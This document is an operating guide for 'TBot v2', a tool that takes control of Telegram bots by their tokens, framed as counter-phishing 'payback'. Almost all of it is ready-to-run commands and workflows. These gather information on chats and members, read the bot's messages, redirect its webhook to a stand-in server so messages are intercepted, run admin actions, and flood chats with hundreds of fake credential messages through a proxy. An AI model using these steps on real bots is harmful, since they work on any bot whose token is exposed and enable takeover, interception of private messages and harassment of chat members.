# TBot v2 — Standard Operating Procedure (SOP)

## Setup

Replace `BOT_ID` and `TOKEN` with your actual credentials throughout.

```
BOT_ID=8611699104
TOKEN=YOUR_TOKEN_HERE
```

Shorthand used below:

```
BASE="python3 tbotv2.py --bot-id $BOT_ID --token $TOKEN"
```

You can paste the line above into your terminal to set the variable, then use `$BASE` in all commands.
Or just copy the full commands below and replace the values manually.

---

## 1. RECONNAISSANCE

### 1.1 Full Recon (bot info + webhook status)

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN recon
```

Returns: Bot name, username, permissions, webhook URL, pending updates, errors.

### 1.2 Read Pending Messages

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN read
```

Returns: All unread messages sent to the bot (sender, chat, text, attachments).

Options:

```bash
# Limit to 10 messages
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN read --limit 10

# Long poll (wait up to 30s for new messages)
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN read --timeout 30

# Skip already-seen messages (use update_id from previous read + 1)
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN read --offset 123456790
```

### 1.3 Live Monitor (continuous stream)

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN monitor
```

Press Ctrl+C to stop. Options:

```bash
# Poll every 5 seconds instead of default 2
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN monitor --interval 5
```

### 1.4 Get Chat Info

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN chat-info --chat-id -963346555
```

Returns: Chat type, title, description, invite link, pinned message, full JSON.

### 1.5 List Chat Administrators

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN admins --chat-id -963346555
```

Returns: All admins with name, username, user ID, and role.

### 1.6 Get Chat Member Count

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN member-count --chat-id -963346555
```

### 1.7 Get Specific Member Info

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN get-member --chat-id -963346555 --user-id 123456789
```

Returns: Name, username, status, premium, full JSON.

### 1.8 Get Webhook Info (raw JSON)

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN get-webhook
```

### 1.9 Get File Download URL

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN get-file --file-id FILE_ID_HERE
```

Note: Get file_id from message attachments shown in `read` or `monitor` output.

---

## 2. SENDING MESSAGES

### 2.1 Send Plain Text

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN send --chat-id -963346555 --text "Hello from TBot"
```

### 2.2 Send with HTML Formatting

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN send --chat-id -963346555 --text "<b>Bold</b> and <i>italic</i>" --parse-mode HTML
```

### 2.3 Send with Markdown

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN send --chat-id -963346555 --text "*Bold* and _italic_" --parse-mode Markdown
```

### 2.4 Send Silently (no notification)

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN send --chat-id -963346555 --text "Silent message" --silent
```

### 2.5 Forward a Message

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN forward --from-chat-id -963346555 --to-chat-id -111222333 --message-id 42
```

### 2.6 Delete a Message

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN delete-msg --chat-id -963346555 --message-id 42
```

---

## 3. WEBHOOK CONTROL

### 3.1 View Current Webhook

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN get-webhook
```

### 3.2 Delete Webhook (enables getUpdates/read)

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN delete-webhook
```

### 3.3 Delete Webhook + Drop All Pending Updates

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN delete-webhook --drop-pending
```

### 3.4 Set/Hijack Webhook (redirect all messages to your server)

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN set-webhook --url https://your-server.com/webhook
```

### 3.5 Set Webhook with Secret Token

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN set-webhook --url https://your-server.com/webhook --secret-token mysecret123
```

---

## 4. CHAT ADMIN ACTIONS

### 4.1 Ban a User

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN ban --chat-id -963346555 --user-id 123456789
```

### 4.2 Unban a User

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN unban --chat-id -963346555 --user-id 123456789
```

### 4.3 Pin a Message

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN pin --chat-id -963346555 --message-id 42
```

### 4.4 Pin Silently (no notification)

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN pin --chat-id -963346555 --message-id 42 --silent
```

### 4.5 Unpin a Specific Message

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN unpin --chat-id -963346555 --message-id 42
```

### 4.6 Unpin Latest Pinned Message

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN unpin --chat-id -963346555
```

### 4.7 Set Chat Title

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN set-title --chat-id -963346555 --title "New Chat Title"
```

### 4.8 Set Chat Description

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN set-description --chat-id -963346555 --description "New description here"
```

### 4.9 Export Chat Invite Link

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN export-invite --chat-id -963346555
```

### 4.10 Make Bot Leave a Chat

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN leave --chat-id -963346555
```

---

## 5. ADVANCED

### 5.1 Call Any Raw API Method (no params)

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN raw --method getMe
```

### 5.2 Raw API Method with JSON Params

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN raw --method sendMessage --params '{"chat_id":"-963346555","text":"hello from raw"}'
```

### 5.3 Raw: Get User Profile Photos

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN raw --method getUserProfilePhotos --params '{"user_id":123456789}'
```

### 5.4 Raw: Get Chat Member Count

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN raw --method getChatMemberCount --params '{"chat_id":"-963346555"}'
```

### 5.5 Raw: Set My Commands (add bot menu commands)

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN raw --method setMyCommands --params '{"commands":[{"command":"start","description":"Start the bot"},{"command":"help","description":"Get help"}]}'
```

### 5.6 Raw: Delete My Commands

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN raw --method deleteMyCommands
```

### 5.7 Log Out Bot (disables for 10 minutes)

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN logout
```

---

## 6. ORIGINAL SPAM (Phisher Payback)

### 6.1 Basic Spam (default fake credentials message)

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN spam --chat-id 963346555 --messages 100
```

### 6.2 Custom Text Spam

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN spam --chat-id 963346555 --messages 50 --text "You've been caught phishing"
```

### 6.3 Spam with Random Variables

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN spam --chat-id 963346555 --messages 50 --text "Email: P_EMAIL | Pass: P_PASSWORD | IP: P_IP | City: P_CITY"
```

Available variables: `P_IP`, `P_EMAIL`, `P_PASSWORD`, `P_ZIP`, `P_CITY`, `P_RANDHIGHINT`, `P_ORG`

### 6.4 Spam with Custom Timing

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN spam --chat-id 963346555 --messages 200 --min-sleep 2 --max-sleep 10
```

### 6.5 Spam with Custom Wordlists

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN spam --chat-id 963346555 --messages 100 --name-list names.txt --surname-list surnames.txt --domain-list domains.txt --city-list cities.txt
```

### 6.6 Spam with Proxy

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN --proxy 127.0.0.1 --proxy-port 9050 spam --chat-id 963346555 --messages 100
```

### 6.7 Spam Skip Connectivity Check

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN spam --chat-id 963346555 --messages 100 --disable-check
```

---

## 7. USING PROXY (applies to any command)

```bash
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN --proxy 127.0.0.1 --proxy-port 9050 recon
python3 tbotv2.py --bot-id 8611699104 --token YOUR_TOKEN --proxy 127.0.0.1 --proxy-port 9050 read
```

---

## 8. QUICK CURL TESTS (no Python needed)

These hit the Telegram API directly from terminal:

```bash
# Bot info
curl "https://api.telegram.org/bot8611699104:YOUR_TOKEN/getMe"

# Webhook status
curl "https://api.telegram.org/bot8611699104:YOUR_TOKEN/getWebhookInfo"

# Read updates
curl "https://api.telegram.org/bot8611699104:YOUR_TOKEN/getUpdates"

# Send message
curl "https://api.telegram.org/bot8611699104:YOUR_TOKEN/sendMessage?chat_id=-963346555&text=hello"

# Get chat info
curl "https://api.telegram.org/bot8611699104:YOUR_TOKEN/getChat?chat_id=-963346555"

# Get admins
curl "https://api.telegram.org/bot8611699104:YOUR_TOKEN/getChatAdministrators?chat_id=-963346555"

# Delete webhook
curl "https://api.telegram.org/bot8611699104:YOUR_TOKEN/deleteWebhook"

# Member count
curl "https://api.telegram.org/bot8611699104:YOUR_TOKEN/getChatMemberCount?chat_id=-963346555"
```

---

## 9. COMMON WORKFLOWS

### Workflow A: First-time bot takeover
```bash
# 1. Recon
python3 tbotv2.py --bot-id BOT_ID --token TOKEN recon

# 2. Delete any existing webhook so we can read messages
python3 tbotv2.py --bot-id BOT_ID --token TOKEN delete-webhook

# 3. Read all pending messages
python3 tbotv2.py --bot-id BOT_ID --token TOKEN read

# 4. Start live monitoring
python3 tbotv2.py --bot-id BOT_ID --token TOKEN monitor
```

### Workflow B: Investigate a chat
```bash
# 1. Chat details
python3 tbotv2.py --bot-id BOT_ID --token TOKEN chat-info --chat-id -CHATID

# 2. Who are the admins
python3 tbotv2.py --bot-id BOT_ID --token TOKEN admins --chat-id -CHATID

# 3. How many members
python3 tbotv2.py --bot-id BOT_ID --token TOKEN member-count --chat-id -CHATID

# 4. Check specific user
python3 tbotv2.py --bot-id BOT_ID --token TOKEN get-member --chat-id -CHATID --user-id USERID
```

### Workflow C: Hijack webhook to intercept phisher data
```bash
# 1. Check current webhook
python3 tbotv2.py --bot-id BOT_ID --token TOKEN get-webhook

# 2. Replace with your server
python3 tbotv2.py --bot-id BOT_ID --token TOKEN set-webhook --url https://your-server.com/hook

# 3. All messages now go to your server instead of the phisher's
```

### Workflow D: Flood phisher bot
```bash
# 1. Recon first
python3 tbotv2.py --bot-id BOT_ID --token TOKEN recon

# 2. Spam with realistic fake data
python3 tbotv2.py --bot-id BOT_ID --token TOKEN spam --chat-id CHATID --messages 500 --min-sleep 1 --max-sleep 3

# 3. Or custom message
python3 tbotv2.py --bot-id BOT_ID --token TOKEN spam --chat-id CHATID --messages 500 --text "FAKE: P_EMAIL | P_PASSWORD | P_IP"
```

---

## NOTES

- **chat-id with negative sign** (e.g. `-963346555`): group/supergroup/channel
- **chat-id positive**: individual user DM
- **getUpdates vs Webhook**: mutually exclusive. If webhook is active, delete it first to use `read`/`monitor`
- **Updates expire after 24 hours** on Telegram's servers
- **Bot can't initiate DMs**: a user must message the bot first
- **Admin commands** (ban, pin, set-title, etc.) only work if the bot has admin rights in the chat
- **raw command**: escape JSON properly in your shell — use single quotes around the JSON string
